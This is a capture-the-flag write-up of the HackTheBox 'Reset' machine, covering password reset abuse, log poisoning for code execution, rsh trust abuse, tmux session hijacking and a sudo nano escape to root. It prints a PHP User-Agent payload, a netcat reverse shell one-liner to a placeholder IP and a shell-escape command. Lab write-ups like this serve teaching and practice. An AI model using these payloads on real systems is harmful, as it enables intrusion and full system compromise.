## **Hello everyone!**

**In this write-up, we will walk through the exploitation of the “Reset” machine from HackTheBox, an easy Linux box involving password reset abuse, LFI-to-RCE through log poisoning, R-services abuse, and privilege escalation via sudo misconfigurations.**

Let’s get started!

![image](/HTB/Reset/Reset_images/1.png)


(ensure that you have added the following line: `TARGET_IP    reset.htb` to your local /etc/hosts file in order to perform a DNS resolution and set up our potential further enumerations)

## Information Gathering

First, we will run an aggressive Nmap scan to gather as much information as possible:

![image](/HTB/Reset/Reset_images/2.png)

We can identify five running services on the target:

**SSH** (22)

**HTTP** (80)

**Netkit?** (512, 513, 514)

The three last ports are intriguing, but we will leave them aside for now and explore the web server which seems to host an admin login panel.

![image](/HTB/Reset/Reset_images/3.png)

## Initial Access

After trying various common credentials and **SQL Injection Bypass** techniques, it seems that we can’t access the dashboard for now. Let’s try to use the *Forgot Password?* button to see what happens:

![image](/HTB/Reset/Reset_images/4.png)

We can see whether we enter a valid username or not. Let’s try to reset the password as **admin**:

![image](/HTB/Reset/Reset_images/5.png)

We successfully reset the admin password! But we cannot retrieve it in cleartext from our web browser, and we don’t have access to admin’s emails. We can intercept the POST request and catch the web server’s response via Burp Suite Proxy, maybe we could retrieve useful information?

![image](/HTB/Reset/Reset_images/6.png)

![image](/HTB/Reset/Reset_images/7.png)

We successfully retrieved the newly generated password for **admin**! We can now use it in order to get authenticated and access the protected dashboard:

![image](/HTB/Reset/Reset_images/8.png)

## Internal Access

It seems that we have two log files: syslog and auth.log. But through Burp Suite, again, we can intercept our request and send it to Repeater in order to manipulate the file path requested by our web browser:

![image](/HTB/Reset/Reset_images/9.png)

Indeed, we have a `file` parameter provided by our POST request which specifies the local file we want to fetch. We can identify that `/var/log/syslog` is the intended file path. But what happens if we try to access sensitive other resources such as the `/etc/passwd` file?

![image](/HTB/Reset/Reset_images/10.png)

We can’t. Maybe the backend web server’s logic restricts access to files outside the `/var` directory. But we still can exploit a vulnerability that could allow us to perform remote code execution (RCE) over the target system. Since it’s a PHP application (we can see it because of the .php extension of dashboard.php), and we have read access to the Apache access logs, we can perform a **log poisoning attack**, a technique that consists of injecting malicious code via our `User-Agent` into the `access.log` file. Since Apache logs HTTP headers, our payload will be written into the `access.log` file. Our code will be stored and can consequently allow arbitrary PHP code execution through the poisoned log file.

To perform this, we need to confirm that we can access the `/var/log/apache2/access.log` file. It should work since the file is part of the `/var` directory.

![image](/HTB/Reset/Reset_images/11.png)

We can see that the file logs our requests to dashboard.php, but also our browser data, contained in the `User-Agent` header. We can confirm the vulnerability by crafting and sending the following payload:

`<?php system('whoami'); ?>`

![image](/HTB/Reset/Reset_images/12.png)

After sending the request, this payload will be saved into the `access.log` file. We can verify that our command has successfully been executed, accessing the file:

![image](/HTB/Reset/Reset_images/13.png)

We can now replace our `whoami` command with a **reverse shell**. Let’s put the following php payload into our User-Agent header and send it again (make sure to set up a netcat listener before via `nc -lvnp PORT`)

`<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP NC_PORT >/tmp/f'); ?>`

![image](/HTB/Reset/Reset_images/14.png)

We can send it. The request will hang because the reverse shell redirects the process output to our listener.

![image](/HTB/Reset/Reset_images/15.png)

We successfully executed arbitrary code by poisoning the `access.log` file in order to obtain initial access! We can stabilize our restricted shell with the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'` 

`export TERM=xterm`

Since we gained access as **www-data**, we don’t have elevated privileges. So we can’t check our current privileges with `sudo -l`. But let’s check whether there are other users on the system:

![image](/HTB/Reset/Reset_images/16.png)

We can locate two users through which we could potentially perform a horizontal privilege escalation: **local** and **sadm**. Let’s inspect their `/home` directory to see if we can retrieve the first flag:

![image](/HTB/Reset/Reset_images/17.png)

We can’t access the /home/local directory, but we can access `/home/sadm` and grab the `user.txt` file.

## Privilege Escalation

Now, we need to find a way to pivot our access to an internal user which could access sensitive files or execute elevated commands. After a basic system enumeration, we can find a valuable `db.sqlite` file stored on the web `/var/www/html` directory.

![image](/HTB/Reset/Reset_images/18.png)

We can use this file to interact with the database using the following command:

`sqlite3 db.sqlite`

![image](/HTB/Reset/Reset_images/19.png)

After dumping the users table, we are able to retrieve a single hash for the admin user we already accessed via the web server, so this is not very helpful.

Continuing our enumeration, we can find an interesting process running as the `sadm` user:

![image](/HTB/Reset/Reset_images/20.png)

There is a **tmux** session running in the background! However, the tmux session belongs to the sadm user, so we first need to pivot to this account before attaching to it.

The **sadm** user can log in using `Rservices` to the machine without providing any password. This can be verified by checking the user’s directory: the presence of the `.rhosts` file indicates that the user trusts remote logins from specific hosts/users without requiring a password.

![image](/HTB/Reset/Reset_images/21.png)

Since we can’t access the file directly, we can confirm that **sadm** is allowed as well through the `/etc/hosts.equiv` file:

![image](/HTB/Reset/Reset_images/22.png)

It is at this particular instance that the port 512,513 and 514 are useful: these ports serve RSH and can be used for this particular case. 

We first need to create the same user on our local machine in order to spoof the access via rsh:

We can log in through this service as the user **sadm** without providing any password since the user is allowed:

![image](/HTB/Reset/Reset_images/23.png)

The password itself does not matter in our case as we will gain access without providing any password, but it is necessary since we are configuring a **legitimate** **user** for authentication.

![image](/HTB/Reset/Reset_images/24.png)

And we successfully pivoted our initial access to the user **sadm**! We should now be able to retrieve the tmux session associated to this user:

![image](/HTB/Reset/Reset_images/25.png)

There is a tmux session called `sadm_session`. We can attach to the session with the following command:

`tmux attach-session -t sadm_session`

Once attached, the tmux session running in the background becomes accessible.

![image](/HTB/Reset/Reset_images/26.png)

It seems that the user executed a particular command to write an intriguing “7lE2PAfVHfjz4HpE” string into a `firewall.sh` file. Is it the password? Let’s try to run `sudo -l` using the string we found:

![image](/HTB/Reset/Reset_images/27.png)

It works! We can learn that our current user can run three commands with root privileges:

`/usr/bin/nano` on the `/etc/firewall.sh` file

`/usr/bin/tail` on the `/var/log/syslog` file

`/usr/bin/tail` on the `/var/log/auth.log` file

If you didn’t know, `nano` allows spawning a subshell through its built-in features. Since `nano` is executed with sudo privileges, the spawned shell also runs as **root**. We can leverage it to elevate our current shell to a root shell!

Once we executed the `/usr/bin/nano /etc/firewall.sh` command, we can press CTRL+R and CTRL+X to get prompted to enter commands:

![image](/HTB/Reset/Reset_images/28.png)

![image](/HTB/Reset/Reset_images/29.png)

![image](/HTB/Reset/Reset_images/30.png)

Referring to [GTFOBins](https://gtfobins.org/) (which is a very useful resource for binary exploitation / privilege escalation techniques on Linux), we can use the following payload to spawn a bash shell:

`reset; sh 1>&0 2>&0`

Since `nano` is run via `sudo` with root privileges, we will obtain a root bash shell:

![image](/HTB/Reset/Reset_images/31.png)

![image](/HTB/Reset/Reset_images/32.png)

We can run `clear` to clean up the terminal and…

![image](/HTB/Reset/Reset_images/33.png)

We’re root! We can now list the `/root` directory and retrieve the final flag:

![image](/HTB/Reset/Reset_images/34.png)

With that, the machine is fully compromised.

![image](/HTB/Reset/Reset_images/35.png)

## Conclusion

This machine demonstrated how multiple low-severity misconfigurations can be chained into a full system compromise. By abusing the password reset functionality, leveraging an LFI vulnerability for log poisoning, exploiting insecure R-services trust relationships, and abusing sudo permissions on nano, we successfully escalated privileges to root.

**Thank you for reading!**
